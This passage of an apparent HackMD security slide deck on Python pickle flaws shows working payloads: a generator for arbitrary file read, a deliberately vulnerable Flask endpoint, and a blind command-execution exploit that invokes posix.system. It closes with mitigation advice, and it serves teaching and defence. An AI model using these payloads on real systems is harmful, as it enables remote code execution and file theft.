</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/84"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">85</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 137px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/85&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;86&lt;/span&gt;&lt;/a&gt;"><div><h2 class="raw part" data-startline="NaN" data-endline="NaN">_getattribute</h2>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_getattribute</span>(<span class="hljs-params">obj, name</span>):</span>
    <span class="hljs-keyword">for</span> subpath <span class="hljs-keyword">in</span> name.split(<span class="hljs-string">'.'</span>):
        <span class="hljs-keyword">if</span> subpath == <span class="hljs-string">'&lt;locals&gt;'</span>:
            <span class="hljs-keyword">raise</span> AttributeError(<span class="hljs-string">"Can't get local attribute {!r} on {!r}"</span>
                                 .<span class="hljs-built_in">format</span>(name, obj))
        <span class="hljs-keyword">try</span>:
            parent = obj
            obj = <span class="hljs-built_in">getattr</span>(obj, subpath)
        <span class="hljs-keyword">except</span> AttributeError:
            <span class="hljs-keyword">raise</span> AttributeError(<span class="hljs-string">"Can't get attribute {!r} on {!r}"</span>
                                 .<span class="hljs-built_in">format</span>(name, obj)) <span class="hljs-keyword">from</span> <span class="hljs-literal">None</span>
    <span class="hljs-keyword">return</span> obj, parent
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/85"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">86</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 258.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/86&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;87&lt;/span&gt;&lt;/a&gt;"><div><h2 class="raw part" data-startline="NaN" data-endline="NaN">Interesting read wrapper</h2>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span>(<span class="hljs-params">filename, encoding=<span class="hljs-string">'utf-8'</span></span>):</span>
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">'r'</span>, encoding=encoding) <span class="hljs-keyword">as</span> fin:
        <span class="hljs-keyword">return</span> fin.read()
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/86"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">87</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 275px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/87&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;88&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">Can we call this read wrapper</h4>
<ul class="part" data-startline="NaN" data-endline="NaN">
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">Remember <code data-position="NaN" data-size="9">load_inst</code> and <code data-position="NaN" data-size="8">load_obj</code>?</li>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">Achieve arbitrary file read vulnerablity</li>
</ul>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/87"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">88</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 208px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/88&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;89&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">How can we get the content of the file</h4>
<p class="part" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0"><img src="./Security Issues in Python Pickle - HackMD_files/4zGffLc.png" alt="" class="" data-position="NaN" data-size="36"></p>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/88"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">89</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 283px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/89&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;90&lt;/span&gt;&lt;/a&gt;"><div><ul class="part" data-startline="NaN" data-endline="NaN">
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">Construct an animal instance</li>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">Set the name or category to the return value of read wrapper</li>
</ul>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/89"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">90</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 119px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/90&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;91&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">Arbitrary file read first</h4>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs"><span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> struct
<span class="hljs-keyword">import</span> base64

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span>(<span class="hljs-params">filename, encoding=<span class="hljs-string">'utf-8'</span></span>):</span>
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">'r'</span>, encoding=encoding) <span class="hljs-keyword">as</span> fin:
        <span class="hljs-keyword">return</span> fin.read()

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exploit</span>(<span class="hljs-params">filename</span>):</span>
    payload_prefix = <span class="hljs-string">b'''('''</span>
    payload_body = <span class="hljs-string">b"X"</span> + <span class="hljs-built_in">bytes</span>(struct.pack(<span class="hljs-string">"&lt;I"</span>, <span class="hljs-built_in">len</span>(filename))) + <span class="hljs-built_in">bytes</span>(filename, encoding=<span class="hljs-string">"utf-8"</span>)
    payload_suffix = <span class="hljs-string">b'''i__main__\nread\n.'''</span>
    payload = payload_prefix + payload_body + payload_suffix
    <span class="hljs-keyword">assert</span> <span class="hljs-string">b'R'</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> payload
    <span class="hljs-keyword">return</span> payload

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>
    payload = exploit(<span class="hljs-string">"favorite.py"</span>)
    print(<span class="hljs-string">"Payload:"</span>, payload)
    print(<span class="hljs-string">"Length:"</span>, <span class="hljs-built_in">len</span>(payload))
    print(<span class="hljs-string">"Base64:"</span>, base64.b64encode(payload))
 
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    main()
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/90"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">91</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 300.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/91&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;92&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">Arbitrary file read first</h4>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code>(X\x0b\x00\x00\x00favorite.pyi__main__\nread\n.
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/91"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">92</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 119px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/92&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;93&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">Inject arbitrary file read into Animal</h4>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">$ python3 -m pickletools ./y        
    <span class="hljs-number">0</span>: \x80 PROTO      <span class="hljs-number">3</span>
    <span class="hljs-number">2</span>: c    GLOBAL     <span class="hljs-string">'__main__ Animal'</span>
   <span class="hljs-number">19</span>: q    BINPUT     <span class="hljs-number">0</span>
   <span class="hljs-number">21</span>: )    EMPTY_TUPLE
   <span class="hljs-number">22</span>: \x81 NEWOBJ
   <span class="hljs-number">23</span>: q    BINPUT     <span class="hljs-number">1</span>
   <span class="hljs-number">25</span>: }    EMPTY_DICT
   <span class="hljs-number">26</span>: q    BINPUT     <span class="hljs-number">2</span>
   <span class="hljs-number">28</span>: (    MARK
   <span class="hljs-number">29</span>: X        BINUNICODE <span class="hljs-string">'name'</span>
   <span class="hljs-number">38</span>: q        BINPUT     <span class="hljs-number">3</span>
   <span class="hljs-comment"># 40: c        GLOBAL     'favorite name'</span>
   <span class="hljs-comment"># Inject the return value of read</span>
   <span class="hljs-comment"># (X\x0b\x00\x00\x00favorite.pyi__main__\nread\n</span>
   <span class="hljs-number">55</span>: q        BINPUT     <span class="hljs-number">4</span>
   <span class="hljs-number">57</span>: X        BINUNICODE <span class="hljs-string">'category'</span>
   <span class="hljs-number">70</span>: q        BINPUT     <span class="hljs-number">5</span>
   <span class="hljs-number">72</span>: c        GLOBAL     <span class="hljs-string">'favorite category'</span>
   <span class="hljs-number">91</span>: q        BINPUT     <span class="hljs-number">6</span>
   <span class="hljs-number">93</span>: u        SETITEMS   (MARK at <span class="hljs-number">28</span>)
   <span class="hljs-number">94</span>: b    BUILD
   <span class="hljs-number">95</span>: .    STOP
highest protocol among opcodes = <span class="hljs-number">2</span>
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/92"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">93</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 300.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/93&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;94&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">Inject arbitrary file read into Animal</h4>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">\x80\x03c__main__\nAnimal\nq\x00)\x81q\x01}q\x02(X\x04\x00\x00\x00nameq\x03(X\x0b\x00\x00\x00favorite.pyi__main__\nread\nq\x04X\x08\x00\x00\x00categoryq\x05X\x01\x00\x00\x00yq\x06ub.
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/93"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">94</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 119px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/94&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;95&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">Inject arbitrary file read into Animal</h4>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">➜  r python3 -m pickletools ./z
    <span class="hljs-number">0</span>: \x80 PROTO      <span class="hljs-number">3</span>
    <span class="hljs-number">2</span>: c    GLOBAL     <span class="hljs-string">'__main__ Animal'</span>
   <span class="hljs-number">19</span>: q    BINPUT     <span class="hljs-number">0</span>
   <span class="hljs-number">21</span>: )    EMPTY_TUPLE
   <span class="hljs-number">22</span>: \x81 NEWOBJ
   <span class="hljs-number">23</span>: q    BINPUT     <span class="hljs-number">1</span>
   <span class="hljs-number">25</span>: }    EMPTY_DICT
   <span class="hljs-number">26</span>: q    BINPUT     <span class="hljs-number">2</span>
   <span class="hljs-number">28</span>: (    MARK
   <span class="hljs-number">29</span>: X        BINUNICODE <span class="hljs-string">'name'</span>
   <span class="hljs-number">38</span>: q        BINPUT     <span class="hljs-number">3</span>
   <span class="hljs-number">40</span>: (        MARK
   <span class="hljs-number">41</span>: X            BINUNICODE <span class="hljs-string">'favorite.py'</span>
   <span class="hljs-number">57</span>: i            INST       <span class="hljs-string">'__main__ read'</span> (MARK at <span class="hljs-number">40</span>)
   <span class="hljs-number">72</span>: q        BINPUT     <span class="hljs-number">4</span>
   <span class="hljs-number">74</span>: X        BINUNICODE <span class="hljs-string">'category'</span>
   <span class="hljs-number">87</span>: q        BINPUT     <span class="hljs-number">5</span>
   <span class="hljs-number">89</span>: X        BINUNICODE <span class="hljs-string">'y'</span>
   <span class="hljs-number">95</span>: q        BINPUT     <span class="hljs-number">6</span>
   <span class="hljs-number">97</span>: u        SETITEMS   (MARK at <span class="hljs-number">28</span>)
   <span class="hljs-number">98</span>: b    BUILD
   <span class="hljs-number">99</span>: .    STOP
highest protocol among opcodes = <span class="hljs-number">2</span>

</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/94"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">95</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 228.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/95&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;96&lt;/span&gt;&lt;/a&gt;"><div><p class="part" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0"><img src="./Security Issues in Python Pickle - HackMD_files/ChEjNgw.png" alt="" class="" data-position="NaN" data-size="36"></p>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/95"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">96</span></a></div></div></section><section hidden="" aria-hidden="true" class="stack present" style="display: block;" data-slide-number="&lt;a href=&quot;#/7&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;8&lt;/span&gt;&lt;/a&gt;"><div class="pdf-page" style="height: 727px;"><div class="slide-background present" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" hidden="" aria-hidden="true" class="present" style="display: block; left: 19px; top: 314px; width: 960px;" data-slide-number="&lt;a href=&quot;#/7&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;1&lt;/span&gt;&lt;/a&gt;"><div><h2 class="raw part" data-startline="NaN" data-endline="NaN">Vulnerabilities in Wild</h2>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/7"><span class="slide-number-a">8</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">1</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 310px; width: 960px;" data-slide-number="&lt;a href=&quot;#/7/1&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;2&lt;/span&gt;&lt;/a&gt;"><div><ul class="part" data-startline="NaN" data-endline="NaN">
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">Flask</li>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">Django Session</li>
</ul>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/7/1"><span class="slide-number-a">8</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">2</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 125px; width: 960px;" data-slide-number="&lt;a href=&quot;#/7/2&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;3&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">Flask</h4>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs"><span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> base64
<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request
app = Flask(__name__)

<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/'</span></span>)</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hello_world</span>():</span>
    data = base64.b64decode(request.args.get(<span class="hljs-string">"data"</span>))
    <span class="hljs-comment"># assert b'R' not in data</span>
    x = pickle.loads(data)
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">repr</span>(x)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    app.run(host=<span class="hljs-string">'0.0.0.0'</span>, port=<span class="hljs-number">5000</span>)
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/7/2"><span class="slide-number-a">8</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">3</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 165.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/7/3&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;4&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">Blind exploit</h4>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs"><span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> base64

payload = <span class="hljs-string">b"\x80\x04((X\x04\x00\x00\x00codeiflask\nrequest.args.get\niposix\nsystem\n."</span>

data = {
    <span class="hljs-string">"data"</span>:base64.b64encode(payload)
}

print(requests.get(<span class="hljs-string">"http://127.0.0.1:5000/?code=%s"</span> % (sys.argv[<span class="hljs-number">1</span>]), params=data).text)
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/7/3"><span class="slide-number-a">8</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">4</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 194px; width: 960px;" data-slide-number="&lt;a href=&quot;#/7/4&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;5&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">Django</h4>
<ul class="part" data-startline="NaN" data-endline="NaN">
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">Requirements
<ul>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">SECRET_KEY
<ul>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">session forgery</li>
</ul>
</li>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">SESSION_SERIALIZER = PickleSerializer
<ul>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">Remote Code Execution</li>
</ul>
</li>
</ul>
</li>
</ul>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/7/4"><span class="slide-number-a">8</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">5</span></a></div></div></section><section hidden="" aria-hidden="true" class="stack present" style="display: block;" data-slide-number="&lt;a href=&quot;#/8&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;9&lt;/span&gt;&lt;/a&gt;"><div class="pdf-page" style="height: 727px;"><div class="slide-background present" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" hidden="" aria-hidden="true" class="present" style="display: block; left: 19px; top: 279px; width: 960px;" data-slide-number="&lt;a href=&quot;#/8&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;1&lt;/span&gt;&lt;/a&gt;"><div><h3 class="raw part" data-startline="NaN" data-endline="NaN">Mitigation strategies</h3>
<h3 class="raw part" data-startline="NaN" data-endline="NaN">Best practices</h3>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/8"><span class="slide-number-a">9</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">1</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 283px; width: 960px;" data-slide-number="&lt;a href=&quot;#/8/1&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;2&lt;/span&gt;&lt;/a&gt;"><div><ul class="part" data-startline="NaN" data-endline="NaN">
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0"><strong data-position="NaN" data-size="0">Never</strong> unpickle data that could have come from an untrusted source, or that could have been tampered with.</li>
</ul>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/8/1"><span class="slide-number-a">9</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">2</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 302px; width: 960px;" data-slide-number="&lt;a href=&quot;#/8/2&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;3&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">Unpickle Data from disk</h4>
<ul class="part" data-startline="NaN" data-endline="NaN">
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">Ensure strict file permissions</li>
</ul>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/8/2"><span class="slide-number-a">9</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">3</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 275px; width: 960px;" data-slide-number="&lt;a href=&quot;#/8/3&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;4&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">Unpickle Data from network</h4>
<ul class="part" data-startline="NaN" data-endline="NaN">
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">Ensure network traffic is not altered in transimission</li>
</ul>
